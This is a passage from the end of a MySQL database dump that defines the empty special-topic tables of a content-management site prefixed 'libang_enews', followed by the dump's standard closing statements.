) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsyh`
--

LOCK TABLES `libang_enewsyh` WRITE;
/*!40000 ALTER TABLE `libang_enewsyh` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsyh` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewszt`
--

DROP TABLE IF EXISTS `libang_enewszt`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewszt` (
  `ztid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `ztname` varchar(60) NOT NULL DEFAULT '',
  `onclick` int(10) unsigned NOT NULL DEFAULT '0',
  `ztnum` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `listtempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ztpath` varchar(255) NOT NULL DEFAULT '',
  `zttype` varchar(10) NOT NULL DEFAULT '',
  `zturl` varchar(200) NOT NULL DEFAULT '',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `islist` tinyint(1) NOT NULL DEFAULT '0',
  `maxnum` int(11) NOT NULL DEFAULT '0',
  `reorder` varchar(50) NOT NULL DEFAULT '',
  `intro` text NOT NULL,
  `ztimg` varchar(255) NOT NULL DEFAULT '',
  `zcid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `showzt` tinyint(1) NOT NULL DEFAULT '0',
  `ztpagekey` varchar(255) NOT NULL DEFAULT '',
  `classtempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `usezt` tinyint(1) NOT NULL DEFAULT '0',
  `yhid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `closepl` tinyint(1) NOT NULL DEFAULT '0',
  `checkpl` tinyint(1) NOT NULL DEFAULT '0',
  `restb` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `usernames` varchar(255) NOT NULL DEFAULT '',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `pltempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`ztid`),
  KEY `classid` (`classid`),
  KEY `zcid` (`zcid`),
  KEY `usezt` (`usezt`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewszt`
--

LOCK TABLES `libang_enewszt` WRITE;
/*!40000 ALTER TABLE `libang_enewszt` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewszt` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsztadd`
--

DROP TABLE IF EXISTS `libang_enewsztadd`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsztadd` (
  `ztid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `classtext` mediumtext NOT NULL,
  PRIMARY KEY (`ztid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsztadd`
--

LOCK TABLES `libang_enewsztadd` WRITE;
/*!40000 ALTER TABLE `libang_enewsztadd` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsztadd` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsztclass`
--

DROP TABLE IF EXISTS `libang_enewsztclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsztclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsztclass`
--

LOCK TABLES `libang_enewsztclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsztclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsztclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsztf`
--

DROP TABLE IF EXISTS `libang_enewsztf`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsztf` (
  `fid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `f` varchar(30) NOT NULL DEFAULT '',
  `fname` varchar(30) NOT NULL DEFAULT '',
  `fform` varchar(20) NOT NULL DEFAULT '',
  `fhtml` mediumtext NOT NULL,
  `fzs` varchar(255) NOT NULL DEFAULT '',
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ftype` varchar(30) NOT NULL DEFAULT '',
  `flen` varchar(20) NOT NULL DEFAULT '',
  `fvalue` text NOT NULL,
  `fformsize` varchar(12) NOT NULL DEFAULT '',
  PRIMARY KEY (`fid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsztf`
--

LOCK TABLES `libang_enewsztf` WRITE;
/*!40000 ALTER TABLE `libang_enewsztf` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsztf` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsztinfo`
--

DROP TABLE IF EXISTS `libang_enewsztinfo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsztinfo` (
  `zid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `ztid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `cid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `isgood` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`zid`),
  KEY `ztid` (`ztid`),
  KEY `cid` (`cid`),
  KEY `classid` (`classid`),
  KEY `id` (`id`),
  KEY `newstime` (`newstime`),
  KEY `mid` (`mid`),
  KEY `isgood` (`isgood`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsztinfo`
--

LOCK TABLES `libang_enewsztinfo` WRITE;
/*!40000 ALTER TABLE `libang_enewsztinfo` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsztinfo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewszttype`
--

DROP TABLE IF EXISTS `libang_enewszttype`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewszttype` (
  `cid` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `ztid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `cname` varchar(20) NOT NULL DEFAULT '',
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `islist` tinyint(1) NOT NULL DEFAULT '0',
  `listtempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `maxnum` int(10) unsigned NOT NULL DEFAULT '0',
  `tnum` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `reorder` varchar(50) NOT NULL DEFAULT '',
  `ttype` varchar(10) NOT NULL DEFAULT '',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `tfile` varchar(60) NOT NULL DEFAULT '',
  PRIMARY KEY (`cid`),
  KEY `ztid` (`ztid`),
  KEY `myorder` (`myorder`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewszttype`
--

LOCK TABLES `libang_enewszttype` WRITE;
/*!40000 ALTER TABLE `libang_enewszttype` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewszttype` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewszttypeadd`
--

DROP TABLE IF EXISTS `libang_enewszttypeadd`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewszttypeadd` (
  `cid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `classtext` mediumtext NOT NULL,
  PRIMARY KEY (`cid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewszttypeadd`
--

LOCK TABLES `libang_enewszttypeadd` WRITE;
/*!40000 ALTER TABLE `libang_enewszttypeadd` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewszttypeadd` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2023-03-25 23:01:24
